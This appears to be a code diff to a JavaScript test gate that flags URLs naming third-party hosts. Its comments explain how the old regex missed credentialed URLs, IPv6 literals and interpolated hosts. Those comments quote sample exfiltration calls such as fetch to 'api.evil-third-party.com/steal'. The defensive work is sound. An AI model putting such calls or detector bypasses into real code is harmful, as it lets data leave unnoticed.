@@ -298,20 +298,85 @@ const support = new Set(
 /** Everything the host scan reads: the tests, and the modules they can execute. */
 const scanned = [...files, ...support];
 
+/**
+ * Every `http(s)://` occurrence's AUTHORITY — userinfo, host and port, up to the first `/`, `?` or `#`.
+ *
+ * ⛔ It captures the authority rather than the host because the host cannot be read without first
+ * accounting for what may precede it. See {@link hostOf}.
+ */
+const URL_AUTHORITY = /https?:\/\/([^/?#\s"'`]*)/g;
+
+/**
+ * The host an occurrence actually names, or `null` when it names none.
+ *
+ * ⛔⛔ **THE PATTERN THIS REPLACES — `https?:\/\/([A-Za-z0-9._-]+)` — WAS BLIND IN TWO DIRECTIONS AND
+ * NOISY IN A THIRD.** All three were driven against this gate at `a59607a`, in this repository, with a
+ * positive control that fires (`https://api.evil-third-party.com/x` → refused, naming that host):
+ *
+ * **1 · A CREDENTIALED URL YIELDED THE USERNAME.** `:` and `@` are outside that character class, so
+ * `fetch("https://user@api.evil-third-party.com/steal")` was reported as naming the host `user`. ⚠️ It
+ * still went RED, so nothing passed silently — **what was poisoned is the DECLARATION path.** A reader
+ * meeting `user` reasonably records it as a placeholder in a credential fixture, and that one entry then
+ * exempts every credentialed URL to every third party, because the scan never sees anything else. Driven:
+ * with `"user"` declared, a body fetching `https://user@api.evil-third-party.com/exfiltrate` **and**
+ * `https://user@another-real-host.net/also` exits **0** and prints
+ * `1 third-party host(s), each enumerated as named-not-called`.
+ *
+ * **2 · ⛔⛔ AN IPv6 LITERAL WAS INVISIBLE ENTIRELY, AND THIS ONE FAILS OPEN WITH NO DECLARATION
+ * NEEDED.** `[` is outside the class, so the pattern matched nothing at all. Driven, and the contrast is
+ * the whole finding — the same destination, twice:
+ *
+ * ```
+ * fetch("https://one.one.one.one/dns-query")              -> refused, names one.one.one.one
+ * fetch("https://[2606:4700:4700::1111]/dns-query")       -> EXIT 0, nothing reported
+ * ```
+ *
+ * A test reaching a third party over an address literal passed this gate without anyone declaring
+ * anything. ⇒ Brackets are read, and `RESERVED` already covers `[::1]`, so loopback stays hermetic.
+ *
+ * **3 · AN INTERPOLATED AUTHORITY YIELDED A FRAGMENT OF THE USERINFO.** `https://u:p@${HOST}/x` names no
+ * host, and the old trailing-`$` check could not see it because the `$` is not at the end of the match —
+ * it reported `u`. ⚠️ A blanket skip on `${` would be wrong the other way: `https://real.example.com${path}`
+ * DOES name its host. So the authority is truncated at the first `${` and whatever is literally written
+ * before it still counts.
+ *
+ * ⚠️ **And one thing that is NOT a defect in the old pattern, recorded so nobody hunts for it:** the host
+ * CHARSET check below. `[A-Za-z0-9._-]+` got that for free by construction; capturing the authority loses
+ * it, and without it a bare `https://…` in a comment reads as a third-party host named `…`. It is a
+ * companion to this change, not a fault in what came before.
+ *
+ * ⚠️ `integra-agentic-commerce` carries the original line — agent-commerce-plan#147.
+ *
+ * @param {string} authority the captured authority.
+ * @returns {string | null} the lowercased host, or null if the occurrence names none.
+ */
+const hostOf = (authority) => {
+  // Only what is LITERALLY written can be judged.
+  const literal = authority.split("${")[0];
+  const at = literal.lastIndexOf("@");
+  const hostPort = at === -1 ? literal : literal.slice(at + 1);
+  if (hostPort === "") return null;
+  if (hostPort.startsWith("[")) {
+    const close = hostPort.indexOf("]");
+    return close === -1 ? null : hostPort.slice(0, close + 1).toLowerCase();
+  }
+  const host = /^[A-Za-z0-9._-]+/.exec(hostPort.split(":")[0]);
+  return host === null ? null : host[0].toLowerCase();
+};
+
 const found = new Map();
 for (const file of scanned) {
   const source = sourceOf(file);
-  for (const match of source.matchAll(/https?:\/\/([A-Za-z0-9._-]+)/g)) {
-    // ⛔⛔ LOWERCASED, AND THE PORT IS WHAT FOUND THIS. Host names are case-insensitive (RFC 4343), and
-    // `RESERVED` carries no `i` flag — so `https://Seller.Example/Terms/AbC.md`, in
-    // `discovery/test/discovery.test.ts`, was reported as an undeclared third-party host despite
-    // `.example` being RFC 2606 reserved. Declaring it would have written a permanent exception for a
-    // host that does not exist, to work around a case-sensitive regex. ⚠️ The same line is in
-    // `integra-agentic-commerce`'s copy of this gate and is latent there only because nothing in that
-    // tree spells a reserved host in mixed case — agent-commerce-plan#147.
-    const host = match[1].toLowerCase();
-    // A template literal — `https://${origin}/x` or `https://seam${i}.example` — names no host at all.
-    if (source[match.index + match[0].length] === "$") continue;
+  for (const match of source.matchAll(URL_AUTHORITY)) {
+    // ⛔⛔ LOWERCASED BY `hostOf`, AND THE PORT TO `integra-agentic-terms` IS WHAT FOUND THIS. Host names
+    // are case-insensitive (RFC 4343), and `RESERVED` carries no `i` flag — so
+    // `https://Seller.Example/Terms/AbC.md`, in `discovery/test/discovery.test.ts`, was reported as an
+    // undeclared third-party host despite `.example` being RFC 2606 reserved. Declaring it would have
+    // written a permanent exception for a host that does not exist, to work around a case-sensitive
+    // regex. ⚠️ The same line is in `integra-agentic-commerce`'s copy and is latent there only because
+    // nothing in that tree spells a reserved host in mixed case — agent-commerce-plan#147.
+    const host = hostOf(match[1]);
+    if (host === null) continue;
     if (RESERVED.test(host)) continue;
     if (!found.has(host)) found.set(host, new Set());
     found.get(host).add(file.slice(root.length));
